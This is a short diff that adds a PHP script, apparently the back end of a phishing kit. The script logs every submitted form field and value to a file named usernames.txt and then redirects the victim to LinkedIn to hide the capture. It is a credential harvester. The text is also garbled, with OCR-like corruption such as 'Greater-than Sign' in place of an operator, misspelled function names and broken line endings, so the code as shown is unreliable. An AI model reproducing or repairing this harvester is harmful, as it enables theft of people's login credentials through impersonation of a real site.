@@ -1,0 +1,13 @@
+<?php header ('location:');
+$handle=fopen("usernames.txt", "a");
+foreach($_POST as $variable=Greater-than
+Sign $value)
+{
+write ($handle, $variable);
+fwrite($handle," -");
+write ($handle, $value); fwrite ($handle, "(r\n");
+} fwrite($handle,"(rin");
+fclose ($handle);
+header("location:https:// www.linkedin.com/");
+exit;
+?>
